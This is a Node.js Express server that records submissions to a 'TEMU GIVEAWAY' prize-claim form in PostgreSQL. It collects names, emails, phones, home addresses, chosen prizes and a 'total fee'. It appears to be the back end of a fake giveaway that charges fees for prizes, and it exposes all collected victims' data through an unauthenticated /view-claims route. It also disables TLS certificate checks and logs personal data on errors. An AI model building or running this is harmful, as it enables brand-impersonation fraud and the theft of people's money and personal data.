const express = require('express');
const path = require('path');
const { Pool } = require('pg');

const app = express();
const PORT = process.env.PORT || 3000; 

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// --- PostgreSQL Database Setup ---
const DATABASE_URL = process.env.DATABASE_URL;

if (!DATABASE_URL) {
    console.error("FATAL ERROR: DATABASE_URL environment variable is not set. Database connection will fail.");
}

const pool = new Pool({
    connectionString: DATABASE_URL,
    ssl: DATABASE_URL ? {
        rejectUnauthorized: false
    } : false
});

// Function to ensure the 'claims' table exists (Non-destructive)
const setupDatabase = async () => {
    if (!DATABASE_URL) {
        console.log("Skipping database setup as DATABASE_URL is missing.");
        return;
    }
    try {
        const client = await pool.connect();
        
        // FIX 1: Use IF NOT EXISTS for persistent data storage.
        await client.query(`
            CREATE TABLE IF NOT EXISTS claims (
                id SERIAL PRIMARY KEY,
                full_name VARCHAR(255) NOT NULL,
                email VARCHAR(255) NOT NULL,
                phone VARCHAR(50),
                city VARCHAR(100),
                full_address TEXT NOT NULL,
                selected_prizes JSONB NOT NULL,
                total_fee INTEGER NOT NULL,
                claim_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
            );
        `);
        client.release();
        console.log("PostgreSQL: 'claims' table structure verified. Data is now persistent.");
    } catch (err) {
        console.error("PostgreSQL CRITICAL SETUP ERROR:", err.stack);
    }
};

setupDatabase();


// =========================================================
// TEMPORARY DATA RETRIEVAL ROUTE (GET /view-claims)
// =========================================================
// FIX 2: Reverting to the old name (/view-claims) for user convenience.
app.get('/view-claims', async (req, res) => {
    if (!DATABASE_URL) {
        return res.status(500).set('Content-Type', 'text/plain').send('Database not configured.');
    }
    
    try {
        const client = await pool.connect();
        const result = await client.query('SELECT * FROM claims ORDER BY claim_date DESC;');
        const claims = result.rows;
        client.release();

        if (claims.length === 0) {
            return res.set('Content-Type', 'text/plain').send("No claim data found in the database yet.");
        }

        // Format the claims into clean, readable plain text
        let output = "--- TEMU GIVEAWAY CLAIM SUBMISSIONS ---\n";
        
        claims.forEach((claim, index) => {
            output += `\n=======================================================\n`;
            output += `CLAIM ID: ${claim.id || index + 1} | DATE: ${claim.claim_date.toLocaleString()}\n`;
            output += `=======================================================\n`;
            output += `Full Name: ${claim.full_name}\n`;
            output += `Email: ${claim.email}\n`;
            output += `Phone: ${claim.phone || 'N/A'}\n`;
            output += `City: ${claim.city || 'N/A'}\n`;
            output += `Address: ${claim.full_address}\n`;
            output += `Total Fee: $${claim.total_fee}\n`;
            
            try {
                const prizes = claim.selected_prizes;
                output += `Selected Prizes:\n${JSON.stringify(prizes, null, 2)}\n`;
            } catch (e) {
                output += `Selected Prizes (Raw): ${String(claim.selected_prizes)}\n`;
            }
        });
        
        res.set('Content-Type', 'text/plain');
        res.send(output);

    } catch (err) {
        console.error('Database Retrieval Error:', err);
        res.status(500).set('Content-Type', 'text/plain').send(`CRITICAL ERROR FETCHING DATA: ${err.message}`);
    }
});


// --- POST /claim Route Handler (Data Insertion) ---
app.post('/claim', async (req, res) => {
    if (!DATABASE_URL) {
        return res.status(500).json({ success: false, message: 'Database connection failed: DATABASE_URL is not set.' });
    }
    
    const { fullName, email, phone, city, fullAddress, selectedPrizes, totalFee } = req.body;

    // Basic validation
    if (!fullName || !email || !fullAddress || !selectedPrizes || totalFee === undefined) {
        return res.status(400).json({ success: false, message: 'Missing required claim fields.' });
    }
    
    const values = [
        fullName, 
        email, 
        phone, 
        city, 
        fullAddress, 
        JSON.stringify(selectedPrizes), 
        parseInt(totalFee, 10)
    ];

    try {
        const client = await pool.connect();
        
        const query = `
            INSERT INTO claims (full_name, email, phone, city, full_address, selected_prizes, total_fee)
            VALUES ($1, $2, $3, $4, $5, $6, $7)
            RETURNING id;
        `;
        
        const result = await client.query(query, values);
        client.release();

        const claimId = result.rows[0].id;
        const trackingId = `TEMU-CLAIM-${claimId}`;

        res.json({ 
            success: true, 
            message: 'Claim successfully recorded in the PostgreSQL database!', 
            trackingId: trackingId
        });

    } catch (err) {
        // DEBUGGING LOG: Print the error and the values being inserted
        console.error("DATABASE INSERT FAILED. ERROR DETAILS:", err.stack);
        console.error("Attempted values:", values); 
        
        res.status(500).json({ 
            success: false, 
            message: 'Claim failed due to a database error. Check server logs for details.',
            error: err.message
        });
    }
});


// --- Server Startup ---
app.listen(PORT, () => {
    console.log(`Server running successfully on port ${PORT}`);
    if (DATABASE_URL) {
        console.log(`PostgreSQL connection enabled.`);
    } else {
        console.warn(`WARNING: DATABASE_URL is missing. Database operations will fail.`);
    }
});